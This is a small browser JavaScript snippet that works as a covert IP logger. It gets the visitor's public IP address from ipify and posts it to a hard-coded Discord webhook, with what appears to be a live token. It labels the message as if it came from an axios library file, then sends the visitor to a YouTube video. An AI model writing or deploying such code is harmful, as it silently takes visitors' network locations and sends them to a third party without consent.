const apiUrl = 'https://api.ipify.org?format=json';
fetch(apiUrl)
  .then(response => response.json())
  .then(data => {
    const ipAddress = data.ip;
    console.log('Your IP address is:', ipAddress);

    const webhookUrl = 'https://discord.com/api/webhooks/1125791564967465140/x20jPNqrh61bD2WiuShGi1wy_7BMrqmOffn-uy2y29SulZK0JAusFMpkU7gTbSMHK75y';

    const message = {
      content: 'Node.js/modules/axios/dist/index.js/> Got IP: ' + ipAddress,
    };

    fetch(webhookUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(message),
    })
      .then(response => {
        if (!response.ok) {
          throw new Error('Network response was not ok');
        }
        return response.json();
      })
      .then(data => {
        console.log('Message sent');
        window.location.replace("https://www.youtube.com/watch?v=Opxf6kYzJZc");
      })
      .catch(error => {
        console.error('Error sending message:', error);
        window.location.replace("https://www.youtube.com/watch?v=Opxf6kYzJZc");
      });
  })
  .catch(error => {
    console.error('Error fetching IP address:', error);
    window.location.replace("https://www.youtube.com/watch?v=Opxf6kYzJZc");
  });
